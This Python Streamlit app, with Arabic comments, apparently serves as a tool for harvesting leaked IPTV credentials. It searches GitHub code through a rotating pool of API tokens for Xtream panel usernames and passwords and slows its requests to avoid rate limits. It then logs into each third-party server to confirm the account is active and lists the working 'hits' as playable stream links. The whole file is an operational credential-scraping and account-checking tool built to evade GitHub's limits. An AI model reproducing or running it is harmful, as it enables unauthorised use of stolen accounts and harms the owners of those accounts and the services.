import streamlit as st
import requests
import re
import time
import random
from datetime import datetime

# --- إعدادات الواجهة ---
st.set_page_config(page_title="BEAST V46 - UNSTOPPABLE", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False
if "all_hits" not in st.session_state: st.session_state.all_hits = []

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🏴‍☠️ BEAST V46 - THE UNSTOPPABLE</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# ستايل احترافي
st.markdown("""
<style>
    .stApp { background-color: #000; color: #fff; }
    .hit-card { 
        background: #0d1117; border-left: 5px solid #00ff41; 
        padding: 15px; border-radius: 5px; margin-bottom: 10px;
        border-bottom: 1px solid #1a1a1a;
    }
    .status-box { padding: 10px; border-radius: 5px; background: #111; border: 1px solid #333; margin-bottom: 20px; }
    .package-tag { background: #004d40; color: #00ff41; padding: 2px 6px; border-radius: 4px; font-size: 10px; margin-right: 4px; }
</style>
""", unsafe_allow_html=True)

# --- لوحة التحكم ---
with st.sidebar:
    st.title("⚙️ CONTROL PANEL")
    tokens_raw = st.text_area("Tokens (ضع أكبر عدد ممكن):", height=150)
    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    st.divider()
    search_depth = st.slider("عمق البحث (صفحات):", 10, 100, 50)
    delay = st.slider("تأخير الأمان (ثانية):", 2, 10, 5) # هذا السر لعدم التوقف
    
    start_btn = st.button("🚀 إطلاق الهجوم العملاق")
    if st.button("🗑️ تفريغ الذاكرة"):
        st.session_state.all_hits = []
        st.rerun()

# --- مناطق العرض ---
status_area = st.empty()
hits_area = st.container()

# --- الوظائف الذكية ---
def get_extra_info(host, user, pw):
    """جلب الباقات والقنوات لضمان الجودة"""
    try:
        res = requests.get(f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories", timeout=3).json()
        return [c['category_name'] for c in res[:6]] if isinstance(res, list) else []
    except: return []

def run_unstoppable_engine():
    found_count = 0
    t_idx = 0
    
    # كلمات بحث عربية متنوعة جداً لضمان عدم التكرار
    ar_keywords = ["Nilesat", "beIN", "SSC", "Shahid", "VIP", "OSN", "Arabic", "Quran", "Nox", "Lxtream"]
    base_queries = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php" "username"',
        'filename:settings.json "xtream" "password"'
    ]

    while True: # استمرار البحث للأبد
        for q in base_queries:
            # دمج عشوائي للكلمات لفتح نتائج جديدة كل مرة
            current_query = f"{q} {random.choice(ar_keywords)}"
            
            for page in range(1, search_depth):
                if not tokens: 
                    status_area.error("❌ لا توجد توكنات!")
                    return

                token = tokens[t_idx % len(tokens)]
                headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
                
                status_area.markdown(f"""<div class='status-box'>🔎 يبحث الآن عن: <b>{current_query}</b><br>📄 الصفحة: {page} | 🔑 توكن رقم: {t_idx % len(tokens) + 1}</div>""", unsafe_allow_html=True)

                try:
                    res = requests.get(f"https://api.github.com/search/code?q={current_query}&page={page}&per_page=100", headers=headers)
                    
                    if res.status_code == 403: # وصلنا للحد الأقصى
                        status_area.warning(f"⚠️ التوكن {t_idx+1} مجهد.. ننتقل للتوكن التالي ونرتاح {delay} ثواني")
                        t_idx += 1
                        time.sleep(delay)
                        continue

                    data = res.json().get('items', [])
                    if not data: break # انتهت النتائج لهذا البحث، نغير الكلمة

                    for item in data:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        try:
                            content = requests.get(raw_url, timeout=3).text
                            matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                            
                            for h, u, p in matches:
                                if any(hit['host'] == h and hit['user'] == u for hit in st.session_state.all_hits):
                                    continue # منع التكرار
                                    
                                check_res = requests.get(f"{h}/player_api.php?username={u}&password={p}", timeout=3).json()
                                if check_res.get("user_info", {}).get("status") == "Active":
                                    cats = get_extra_info(h, u, p)
                                    new_hit = {"host": h, "user": u, "pw": p, "cats": cats}
                                    st.session_state.all_hits.append(new_hit)
                                    
                                    with hits_area:
                                        st.markdown(f"""
                                        <div class="hit-card">
                                            <b style="color:#00ff41;">✅ HIT #{len(st.session_state.all_hits)}</b><br>
                                            <code style="color:#fff;">{h}/get.php?username={u}&password={p}&type=m3u_plus</code><br>
                                            <div style="margin-top:8px;">
                                                {" ".join([f'<span class="package-tag">{c}</span>' for c in cats])}
                                            </div>
                                        </div>
                                        """, unsafe_allow_html=True)
                        except: continue
                    
                    # تأخير إلزامي لضمان عدم الحظر
                    time.sleep(delay)

                except Exception as e:
                    t_idx += 1
                    continue

# تشغيل
if start_btn and tokens:
    run_unstoppable_engine()
